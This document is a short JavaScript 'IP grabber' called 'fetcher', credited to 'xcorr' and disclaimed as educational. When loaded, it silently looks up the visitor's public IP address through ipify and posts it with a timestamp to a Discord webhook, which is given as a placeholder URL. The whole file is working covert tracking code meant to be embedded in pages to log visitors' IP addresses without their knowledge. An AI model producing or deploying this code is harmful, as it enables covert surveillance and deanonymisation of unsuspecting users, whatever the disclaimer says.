(function() {
    // fetcher - ip grabber by xcorr.
    // educational purposes only. i do not condone any damages caused using this program.
    // see more at: https://github.com/xcorrr

    const webhookURL = "https://discord.com/api/webhooks/webhook-id/webhook-token";
    const now = new Date();

    const month = now.getMonth() + 1;
    const day = now.getDate();
    const year = now.getFullYear();

    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');

    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;

    const currtime = `${month}/${day}/${year} ${hours}:${minutes}:${seconds} ${ampm}`;

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            const message = `> ## IP Logged! :omaga2:\n> IP successfully fetched!\n> Details:\n> IP: ||${data.ip}||\n> \n> Date When Grabbed: ||${currtime}||\n> \n> \n> **Details(raw):**\n> IP: ${data.ip}\n> Date When Grabbed: ${currtime}\n> \n> Grabbed using **fetcher.** - by xcorr.\n> \n> **NOTE:** educational purposes only!`;
            return fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ content: message })
            });
        })
        .then(res => {
            if (res.ok) console.log("Webhook sent.");
            else console.error("Webhook failed:", res.status);
        })
        .catch(err => {
            console.error("Error:", err);
        });

})();